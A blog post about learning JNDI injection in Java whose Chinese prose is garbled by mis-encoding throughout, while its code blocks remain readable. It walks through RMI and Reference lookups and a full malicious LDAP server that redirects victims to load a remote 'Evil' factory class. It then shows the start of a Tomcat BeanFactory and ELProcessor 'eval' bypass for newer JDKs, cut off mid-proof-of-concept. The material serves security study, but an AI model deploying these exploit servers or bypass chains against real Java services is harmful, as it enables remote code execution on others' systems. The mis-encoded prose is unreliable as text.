---
layout:     post                    # ä½¿ç”¨çš„å¸ƒå±€ï¼ˆä¸éœ€è¦æ”¹ï¼‰
title:      JNDIæ³¨å…¥å­¦ä¹                # æ ‡é¢˜ 
subtitle:    #å‰¯æ ‡é¢˜
date:       2022-03-20              # æ—¶é—´
author:     Von                      # ä½œè€…
header-img: img/post-bg-android.jpg    #è¿™ç¯‡æ–‡ç« æ ‡é¢˜èƒŒæ™¯å›¾ç‰‡
catalog: true                       # æ˜¯å¦å½’æ¡£
tags:                               #æ ‡ç­¾
    - Web
    - Java

---

# ä»€ä¹ˆæ˜¯JNDI

JNDI å…¨ç§°ä¸º **Java Naming and Directory Interface**ï¼Œå³ Java åç§°ä¸ç›®å½•æ¥å£ã€‚ä¹Ÿå³JNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œå¹¶ç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„**å‘½åæœåŠ¡**å’Œ**ç›®å½•æœåŠ¡**ï¼Œä»€ä¹ˆæ˜¯å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ï¼Ÿ

- å‘½åæœåŠ¡ï¼šå°±æ˜¯ä¸€ç§é€šè¿‡åç§°æ¥æŸ¥æ‰¾å®é™…å¯¹è±¡çš„æœåŠ¡ã€‚æ¯”å¦‚RMIåè®®ï¼Œå¯ä»¥é€šè¿‡åç§°æ¥æŸ¥æ‰¾å¹¶è°ƒç”¨å…·ä½“çš„è¿œç¨‹å¯¹è±¡ã€‚å†æ¯”å¦‚DNSåè®®ï¼Œé€šè¿‡åŸŸåæ¥æŸ¥æ‰¾å…·ä½“çš„IPåœ°å€ã€‚
- ç›®å½•æœåŠ¡ï¼šç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‰©å±•ï¼Œé™¤äº†åç§°æœåŠ¡ä¸­å·²æœ‰çš„åç§°åˆ°å¯¹è±¡çš„å…³è”ä¿¡æ¯å¤–ï¼Œè¿˜å…è®¸å¯¹è±¡æ‹¥æœ‰å±æ€§ï¼ˆAttributesï¼‰ä¿¡æ¯ã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥æ ¹æ®åç§°å»æŸ¥æ‰¾ï¼ˆLookupï¼‰å¯¹è±¡(å¹¶è·å–å…¶å¯¹åº”å±æ€§)ï¼Œè¿˜å¯ä»¥æ ¹æ®å±æ€§å€¼å»æœç´¢ï¼ˆSearchï¼‰å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªç”¨æˆ·å¯¹è±¡å¯èƒ½æœ‰ç”¨æˆ·åã€å¯†ç ã€ç”µå­é‚®ä»¶åœ°å€å’Œç”µè¯å·ç ç­‰å±æ€§ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥æ ¹æ®å…¶åç§°è¿˜å¯ä»¥æ ¹æ®å·ç æ¥è¿›è¡Œsearchå¾—åˆ°å¯¹è±¡ã€‚

# JNDIçš„ä½¿ç”¨

å¯èƒ½çœ‹äº†ä¸Šé¢çš„è§£é‡Šè¿˜æ˜¯æœ‰ç‚¹äº‘é‡Œé›¾é‡Œçš„ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹å®é™…çš„ä¾‹å­å®è·µä¸€ä¸‹ï¼Œçœ‹çœ‹JNDIä¸RMIçš„ç»“åˆä½¿ç”¨ï¼š

é¦–å…ˆè¿˜æ˜¯è¦å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£ï¼š

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RMIinterface extends Remote {
    String test() throws RemoteException;
}
```

ç„¶åRMIçš„æœåŠ¡ç«¯è¿˜æ˜¯è¦å¼€å¯ï¼ˆè¿™é‡Œå¯ä»¥ä¸æŠŠå¯¹è±¡bindä¸Šï¼Œä½†æ˜¯è¿œç¨‹å¯¹è±¡è¿˜æ˜¯è¦åˆ›å»ºï¼Œä¸åˆ›å»ºçš„è¯è¿›ç¨‹ä¼šç›´æ¥è¿è¡Œç»“æŸï¼‰ï¼š

```java
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class Server extends UnicastRemoteObject implements RMIinterface {

    protected Server() throws RemoteException {
    }

    @Override
    public String test() throws RemoteException {
        System.out.println("Serverï¼šHello!");
        return "Hello!";
    }

    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException {
        Server server = new Server();
        Registry registry = LocateRegistry.createRegistry(1098);
    }
}
```

ç„¶åæ–°å»ºä¸€ä¸ªJNDIæœåŠ¡ç«¯ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®ç”¨æ³•å’Œä¹‹å‰RMIå¾ˆåƒï¼Œéƒ½æœ‰ç€å¦‚bindã€rebindè¿™æ ·çš„æ–¹æ³•ã€‚è¿™é‡Œæ˜¯é€šè¿‡åˆå§‹åŒ–ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè¿™ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒä¸ºåº”ç”¨ç¨‹åºè®¿é—®å‘½åæœåŠ¡æä¾›äº†å¿…è¦çš„ä¿¡æ¯ã€‚ç„¶åå°†ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ç»‘å®šåˆ°RMIæœåŠ¡ä¸Šï¼ˆè¿™é‡Œå…¶å®ä¹Ÿå¯ä»¥ç”¨bindæ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰æ²¡æœ‰ç»‘å®šè¿œç¨‹å¯¹è±¡ï¼‰

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDIServer {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        initialContext.rebind("rmi://localhost:1098/testobj",new Server());
    }
}
```

æœ€ååœ¨JNDIå®¢æˆ·ç«¯ä¸­å®ç°è¿œç¨‹è°ƒç”¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¹Ÿå’ŒRMIçš„éå¸¸ç±»ä¼¼ï¼Œéƒ½æ˜¯ä½¿ç”¨lookupæ–¹æ³•æ¥æŸ¥è¯¢ç›¸å…³çš„è¿œç¨‹å¯¹è±¡å¹¶è¿›è¡Œè°ƒç”¨

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDIClient {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        RMIinterface rmIinterface = (RMIinterface)initialContext.lookup("rmi://localhost:1098/testobj");
        rmIinterface.test();
    }
}
```

ä»ä¸Šé¢çš„ä¾‹å­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒJNDIå…¶å®åªæ˜¯ç›¸å½“äºä¸€ä¸ªç®¡ç†çš„APIï¼ŒçœŸæ­£çš„æœåŠ¡ä»ç„¶æ˜¯é€šè¿‡RMIå®ç°çš„ã€‚å®é™…ä¸Šï¼ŒJNDIå¯¹RMIçš„æ”¯æŒä¹Ÿæ˜¯é€šè¿‡RMIé‚£å¥—å»å®ç°çš„ï¼Œæ‰€ä»¥ä¹‹å‰æˆ‘ä»¬æåˆ°çš„é‚£äº›é’ˆå¯¹RMIçš„æ”»å‡»æ–¹æ³•åœ¨è¿™ç§åœºæ™¯ä¸‹ä¹Ÿæ˜¯é€‚ç”¨çš„ã€‚

# JNDIæ³¨å…¥

ä¸Šé¢æˆ‘ä»¬ä½¿ç”¨çš„`initialContext.rebind("rmi://localhost:1098/testobj",new Server());`å®é™…ä¸Šæ˜¯åœ¨è¿›è¡Œå¯¹å¯¹è±¡çš„å­˜å‚¨ã€‚

å®é™…ä¸ŠJNDIä¸­æ”¯æŒå­˜å‚¨ä»¥ä¸‹å‡ ç§ç±»å‹çš„å¯¹è±¡ï¼š

- [Java serializable objects](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html)
- [`Referenceable` objects and JNDI `Reference`s](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html)
- [Objects with attributes (`DirContext`)](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/dircontext.html)
- [RMI (Java Remote Method Invocation) objects (including those that use IIOP)](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/remote.html)
- [CORBA objects](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/corba.html)

å…¶ä¸­RMIå¯¹è±¡æˆ‘ä»¬ä¹‹å‰æ—©å·²æ¥è§¦è¿‡ï¼Œè€Œserializableå¯¹è±¡ä¹Ÿä¸é™Œç”Ÿï¼Œå‡å¦‚è¦æ˜¯å°†serializableå¯¹è±¡å­˜å‚¨è‡³JNDIæœåŠ¡ä¸­æ˜¾ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å®ç°Clientå’ŒServeré—´çš„è¿œç¨‹é€šä¿¡ï¼ˆè¿™é‡Œä¼šä¸ä¼šæœ‰ååºåˆ—åŒ–æ¼æ´ï¼Ÿï¼‰ï¼Œä½†æ˜¯æœ‰æ—¶è¦æ˜¯åºåˆ—åŒ–å¯¹è±¡å¤ªå¤§çš„è¯å¹¶ä¸æ˜¯Serveræ‰€æ„¿æ„çœ‹åˆ°çš„ï¼Œè¿™ç§æƒ…å†µä¸‹Referenceåº”è¿è€Œç”Ÿã€‚Referenceå¯¹è±¡å®é™…ä¸Šç›¸å½“äºä¸€ä¸ªå°è£…ï¼Œå³å‘ŠçŸ¥å¯¹è±¡çš„åœ°å€ï¼Œç±»åç§°ç­‰ä¿¡æ¯æ¥è®©JNDIæœåŠ¡é‡æ„ä¸€ä¸ªå®Œæ•´çš„å¯¹è±¡ï¼ˆå¬èµ·æ¥æ„Ÿè§‰æœ‰ç‚¹åƒååºåˆ—åŒ–ï¼‰

æ¥çœ‹Referenceçš„æ„é€ æ–¹æ³•ï¼š

```java
public Reference(String className, String factory, String factoryLocation) {
  this(className);
  classFactory = factory;
  classFactoryLocation = factoryLocation;
}
```

å®é™…ä¸Šæ¥è¯´ï¼Œå½“æˆ‘ä»¬æ”¹å†™ä»£ç ä¸ºä»¥ä¸‹æ—¶ï¼š

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;

public class JNDIServer {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        Reference reference = new Reference("Evil", "Evil", "http://localhost:7777");
        initialContext.rebind("rmi://localhost:1098/testobj",reference);
    }
}
```

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDIClient {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        RMIinterface rmIinterface = (RMIinterface)initialContext.lookup("rmi://localhost:1098/testobj");
        rmIinterface.test();
    }
}
```

åœ¨Serverç«¯æˆ‘ä»¬ä¸å†ç»‘å®šè¿œç¨‹å¯¹è±¡ï¼Œè€Œæ˜¯ç»‘å®šä¸€ä¸ªreferenceå¯¹è±¡ï¼Œå½“Clientå°è¯•ä»`"rmi://localhost:1098/testobj"`è·å–è¿œç¨‹å¯¹è±¡æ—¶ï¼Œå½“åœ¨Clientæœ¬åœ°æ— æ³•åŠ è½½åˆ°classFactoryæ—¶ï¼Œä¼šå°è¯•ä»Referenceå¯¹è±¡çš„classFactoryLocationåœ°å€ä¸­åŠ è½½Factoryç±»å¹¶å®ä¾‹åŒ–ï¼ˆæ²¡é”™ï¼Œä¼šè°ƒç”¨å…¶æ— å‚æ„é€ æ–¹æ³•ï¼‰ï¼Œä¸»è¦é€»è¾‘æ˜¯lookupæ—¶ä¼šè°ƒç”¨Naming.getObjectInstance

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively

            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

è€Œè¿™é‡Œé¢åˆè°ƒç”¨äº†`factory = getObjectFactoryFromReference(ref, f);`ï¼Œå½“ä¸­å®ç°äº†å¯¹factoryç±»çš„è¿œç¨‹åŠ è½½å’Œå®ä¾‹åŒ–

```java
static ObjectFactory getObjectFactoryFromReference(
  Reference ref, String factoryName)
  throws IllegalAccessException,
InstantiationException,
MalformedURLException {
  Class<?> clas = null;

  // Try to use current class loader
  try {
    clas = helper.loadClass(factoryName);
  } catch (ClassNotFoundException e) {
    // ignore and continue
    // e.printStackTrace();
  }
  // All other exceptions are passed up.

  // Not in class path; try to use codebase
  String codebase;
  if (clas == null &&
      (codebase = ref.getFactoryClassLocation()) != null) {
    try {
      clas = helper.loadClass(factoryName, codebase);
    } catch (ClassNotFoundException e) {
    }
  }

  return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

å¾ˆæ˜¾ç„¶è¿™é‡Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ¼æ´ï¼Œå°±æ˜¯å½“Clientä¸­lookupçš„å‚æ•°ä¸ºå…¥ä¾µè€…å¯æ§æ—¶ï¼Œæ— è®ºæ˜¯RMIæœåŠ¡å™¨çš„åœ°å€ï¼Œè¿˜æ˜¯Referenceä¸­classFactoryLocationçš„åœ°å€éƒ½å°†æ˜¯å…¥ä¾µè€…å¯æ§çš„ï¼Œè¿™å°±æ˜¯JNDIæ³¨å…¥ï¼Œæµç¨‹å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š

![img](/blog_img/Reference-1-1024x492.png)

# LDAPç»•è¿‡

`JDK 6u141`, `JDK 7u131`, `JDK 8u121`åŠä¹‹åçš„Javaé™åˆ¶äº†é€šè¿‡`RMI`è¿œç¨‹åŠ è½½`Reference`å·¥å‚ç±»ã€‚`com.sun.jndi.rmi.object.trustURLCodebase`ã€`com.sun.jndi.cosnaming.object.trustURLCodebase` çš„é»˜è®¤å€¼å˜ä¸ºäº†`false`ï¼Œå³é»˜è®¤ä¸å…è®¸é€šè¿‡RMIä»è¿œç¨‹çš„`Codebase`åŠ è½½`Reference`å·¥å‚ç±»ã€‚

åœ¨ä½ç‰ˆæœ¬JDK_8u65ä¸‹ï¼Œåœ¨`RegistryContext#decodeObject()`æ–¹æ³•ä¼šç›´æ¥è°ƒç”¨åˆ°`NamingManager#getObjectInstance()`ï¼Œè¿›è€Œè°ƒç”¨`getObjectFactoryFromReference()`æ–¹æ³•æ¥è·å–è¿œç¨‹å·¥å‚ç±»ã€‚

![img](/blog_img/å›¾ç‰‡-10-1024x353.png)

åœ¨é«˜ç‰ˆæœ¬ä¸­çš„`RegistryContext#decodeObject()`æ–¹æ³•åˆ™å¢åŠ äº†å¯¹ç±»å‹ä»¥åŠ`trustURLCodebase`çš„æ£€æŸ¥ã€‚

![img](/blog_img/å›¾ç‰‡-11-1024x366.png)

é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹æ˜¯å¦è¿˜æœ‰æœºä¼šæ¥è¿›è¡ŒJNDIæ³¨å…¥å‘¢ï¼Œå®é™…ä¸Šï¼ŒJDKä¸­JNDIåŸç”Ÿæ”¯æŒå››ç§åè®®ï¼š

- RMI: Java Remote Method Invocationï¼ŒJava è¿œç¨‹æ–¹æ³•è°ƒç”¨
- LDAP: è½»é‡çº§ç›®å½•è®¿é—®åè®®
- CORBA: Common Object Request Broker Architectureï¼Œé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„ï¼Œç”¨äº COS åç§°æœåŠ¡(Common Object Services)
- DNSï¼ˆåŸŸåè½¬æ¢åè®®ï¼‰

åœ¨JDK8u121ä¸­ï¼Œå…¶ä»–ä¸‰ç§åè®®éƒ½è¿›è¡Œäº†å¦‚RMIä¸€èˆ¬çš„ä¿®å¤ï¼Œè€Œå¯¹äºldapåè®®ä»ç„¶å¯ä»¥ç»§ç»­è¢«åˆ©ç”¨ï¼š

æ·»åŠ ä¾èµ–ï¼š

```java
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>3.1.1</version>
    <scope>test</scope>
</dependency>
```

æ„å»ºä¸€ä¸ªLDAPæœåŠ¡ç«¯ï¼š

```java
package JNDI;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main (String[] args) {
        String url = "http://127.0.0.1:8000/#Evil";
        int port = 1234;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */ @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

æ­¤æ—¶ç›¸å½“äºLDAPæœåŠ¡æ˜¯å¼€åœ¨port1234ç«¯å£ï¼Œè€ŒReferenceå¯¹è±¡çš„classFactoryLocationæ‰æ˜¯"http://127.0.0.1:8000/#Evil"

å› æ­¤å¯¹äºå—å®³è€…æ¥è¯´ï¼Œå…¶æ¨¡æ‹Ÿä¸ºï¼š

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDIClient {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        RMIinterface rmIinterface = (RMIinterface)initialContext.lookup("ldap://localhost:1234/Evil");
        rmIinterface.test();
    }
}
```

# é«˜ç‰ˆæœ¬JDKçš„ç»•è¿‡

é—æ†¾çš„æ˜¯ï¼ŒJDK 11.0.1ã€JDK 8u191ã€JDK7u201ã€JDK6u211èµ·LDAPä¸­çš„trustURLCodebaseä¹Ÿå˜æˆäº†False

è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å†ä¹Ÿæ²¡åŠæ³•åƒä»¥å‰é‚£æ ·ç›´æ¥å¯æ§lookupå‚æ•°å°±å¯ä»¥è¿›è¡ŒJNDIæ³¨å…¥äº†ï¼Œä½†è¿˜æ˜¯å­˜åœ¨ä¸€äº›å¯èƒ½çš„ç»•è¿‡æ‰‹æ®µ

## ä½¿ç”¨æœ¬åœ°çš„Reference Factoryç±»

JDK8u191åç°åœ¨æˆ‘ä»¬æ²¡åŠæ³•è¿œç¨‹åŠ è½½ç±»äº†ï¼Œé‚£æˆ‘ä»¬åªèƒ½å¯»æ‰¾å€˜è‹¥æ­£å¸¸æµç¨‹è¿è¡Œæœ‰æ²¡æœ‰å¯ä»¥è§¦å‘æ¼æ´çš„Factoryç±»äº†ï¼Œé¦–å…ˆå›é¡¾ä¸‹å’Œ`getObjectFactoryFromReference`ä¸­çš„å®ç°

```java
return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
```

é¦–å…ˆå¯¹äºä¸€ä¸ªæœ¬åœ°çš„Factoryç±»ï¼Œæœ€å¥½è¦æ˜¯ä»–çš„æ— å‚æ„é€ æ–¹æ³•å°±å¯ä»¥è¢«æˆ‘ä»¬RCEï¼ˆæƒ³ğŸ‘å‘¢ï¼è¿™æ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦ä½¿ä»–ç»§ç»­å¾€ä¸‹é¢èµ°ï¼Œå°±å¿…é¡»ä½¿Factoryç±»æ˜¯å®ç°äº†ObjectFactoryæ¥å£çš„ï¼Œå½“ç„¶äº†ï¼Œè¿˜è¦æ±‚è¿™ä¸ªç±»ä¸èƒ½åªæœ‰æœ‰å‚æ„é€ æ–¹æ³•ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½é¡ºåˆ©æ‰§è¡Œ`clas.newInstance() `å†æ¥çœ‹ä¸‹å¾—åˆ°factoryä¹‹åçš„æ“ä½œï¼Œåœ¨`Naming.getObjectInstance`ä¸­ï¼š

```java
factory = getObjectFactoryFromReference(ref, f);
if (factory != null) {
  return factory.getObjectInstance(ref, name, nameCtx,
                                   environment);
}
// No factory found, so return original refInfo.
// Will reach this point if factory class is not in
// class path and reference does not contain a URL for it
return refInfo;
```

å¾—åˆ°factoryåå‘ç°è°ƒç”¨äº†factoryçš„getObjectInstanceæ–¹æ³•å¹¶è¿”å›ï¼Œæ‰€ä»¥Factoryç±»è¿˜å¿…é¡»æœ‰getObjectInstanceæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›®å‰çš„ä»»åŠ¡å°±æ˜¯éœ€è¦æ‰¾åˆ°ä¸€ä¸ªJDKå†…ç½®çš„æˆ–è€…å¸¸è§çš„ç±»æ»¡è¶³ï¼š

1. å®ç°äº†ObjectFactoryæ¥å£
2. ä¸èƒ½ä»…æœ‰æœ‰å‚æ„é€ æ–¹æ³•
3. æœ‰getObjectInstanceæ–¹æ³•
4. getObjectInstanceä¸­æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹

è¿™é‡Œæœ€ç»ˆæ‰¾åˆ°çš„æ˜¯`org.apache.naming.factory.BeanFactory`ï¼Œè¯¥ç±»å­˜åœ¨äºTomcat8ä¾èµ–åŒ…ä¸­ï¼Œæ”»å‡»é¢å’ŒæˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚

æ¥çœ‹ä¸‹å…¶getObjectInstanceæ–¹æ³•ï¼š

```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                Hashtable<?,?> environment)
  throws NamingException {

  if (obj instanceof ResourceRef) {

    try {

      Reference ref = (Reference) obj;
      String beanClassName = ref.getClassName();
      Class<?> beanClass = null;
      ClassLoader tcl =
        Thread.currentThread().getContextClassLoader();
      if (tcl != null) {
        try {
          beanClass = tcl.loadClass(beanClassName);
        } catch(ClassNotFoundException e) {
        }
      } else {
        try {
          beanClass = Class.forName(beanClassName);
        } catch(ClassNotFoundException e) {
          e.printStackTrace();
        }
      }
      if (beanClass == null) {
        throw new NamingException
          ("Class not found: " + beanClassName);
      }

      BeanInfo bi = Introspector.getBeanInfo(beanClass);
      PropertyDescriptor[] pda = bi.getPropertyDescriptors();

      Object bean = beanClass.newInstance();

      /* Look for properties with explicitly configured setter */
      RefAddr ra = ref.get("forceString");
      Map<String, Method> forced = new HashMap<>();
      String value;

      if (ra != null) {
        value = (String)ra.getContent();
        Class<?> paramTypes[] = new Class[1];
        paramTypes[0] = String.class;
        String setterName;
        int index;

        /* Items are given as comma separated list */
        for (String param: value.split(",")) {
          param = param.trim();
          /* A single item can either be of the form name=method
                         * or just a property name (and we will use a standard
                         * setter) */
          index = param.indexOf('=');
          if (index >= 0) {
            setterName = param.substring(index + 1).trim();
            param = param.substring(0, index).trim();
          } else {
            setterName = "set" +
              param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
              param.substring(1);
          }
          try {
            forced.put(param,
                       beanClass.getMethod(setterName, paramTypes));
          } catch (NoSuchMethodException|SecurityException ex) {
            throw new NamingException
              ("Forced String setter " + setterName +
               " not found for property " + param);
          }
        }
      }

      Enumeration<RefAddr> e = ref.getAll();

      while (e.hasMoreElements()) {

        ra = e.nextElement();
        String propName = ra.getType();

        if (propName.equals(Constants.FACTORY) ||
            propName.equals("scope") || propName.equals("auth") ||
            propName.equals("forceString") ||
            propName.equals("singleton")) {
          continue;
        }

        value = (String)ra.getContent();

        Object[] valueArray = new Object[1];

        /* Shortcut for properties with explicitly configured setter */
        Method method = forced.get(propName);
        if (method != null) {
          valueArray[0] = value;
          try {
            method.invoke(bean, valueArray);
          } catch (IllegalAccessException|
                   IllegalArgumentException|
                   InvocationTargetException ex) {
            throw new NamingException
              ("Forced String setter " + method.getName() +
               " threw exception for property " + propName);
          }
          continue;
        }

        int i = 0;
        for (i = 0; i<pda.length; i++) {

          if (pda[i].getName().equals(propName)) {

            Class<?> propType = pda[i].getPropertyType();

            if (propType.equals(String.class)) {
              valueArray[0] = value;
            } else if (propType.equals(Character.class)
                       || propType.equals(char.class)) {
              valueArray[0] =
                Character.valueOf(value.charAt(0));
            } else if (propType.equals(Byte.class)
                       || propType.equals(byte.class)) {
              valueArray[0] = Byte.valueOf(value);
            } else if (propType.equals(Short.class)
                       || propType.equals(short.class)) {
              valueArray[0] = Short.valueOf(value);
            } else if (propType.equals(Integer.class)
                       || propType.equals(int.class)) {
              valueArray[0] = Integer.valueOf(value);
            } else if (propType.equals(Long.class)
                       || propType.equals(long.class)) {
              valueArray[0] = Long.valueOf(value);
            } else if (propType.equals(Float.class)
                       || propType.equals(float.class)) {
              valueArray[0] = Float.valueOf(value);
            } else if (propType.equals(Double.class)
                       || propType.equals(double.class)) {
              valueArray[0] = Double.valueOf(value);
            } else if (propType.equals(Boolean.class)
                       || propType.equals(boolean.class)) {
              valueArray[0] = Boolean.valueOf(value);
            } else {
              throw new NamingException
                ("String conversion for property " + propName +
                 " of type '" + propType.getName() +
                 "' not available");
            }

            Method setProp = pda[i].getWriteMethod();
            if (setProp != null) {
              setProp.invoke(bean, valueArray);
            } else {
              throw new NamingException
                ("Write not allowed for property: "
                 + propName);
            }

            break;

          }

        }

        if (i == pda.length) {
          throw new NamingException
            ("No set method found for property: " + propName);
        }

      }

      return bean;

    } catch (java.beans.IntrospectionException ie) {
      NamingException ne = new NamingException(ie.getMessage());
      ne.setRootCause(ie);
      throw ne;
    } catch (java.lang.IllegalAccessException iae) {
      NamingException ne = new NamingException(iae.getMessage());
      ne.setRootCause(iae);
      throw ne;
    } catch (java.lang.InstantiationException ie2) {
      NamingException ne = new NamingException(ie2.getMessage());
      ne.setRootCause(ie2);
      throw ne;
    } catch (java.lang.reflect.InvocationTargetException ite) {
      Throwable cause = ite.getCause();
      if (cause instanceof ThreadDeath) {
        throw (ThreadDeath) cause;
      }
      if (cause instanceof VirtualMachineError) {
        throw (VirtualMachineError) cause;
      }
      NamingException ne = new NamingException(ite.getMessage());
      ne.setRootCause(ite);
      throw ne;
    }

  } else {
    return null;
  }

}
```

è¿™æ¬¡çš„æµç¨‹ç›¸å¯¹å¤æ‚ï¼Œæˆ‘ä»¬ç»“åˆPOCæ­£å‘è°ƒè¯•ä¸€ä¸‹ï¼š

```java
InitialContext initialContext = new InitialContext();
Registry registry = LocateRegistry.createRegistry(1097);
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
ref.add(new StringRefAddr("forceString", "x=eval"));
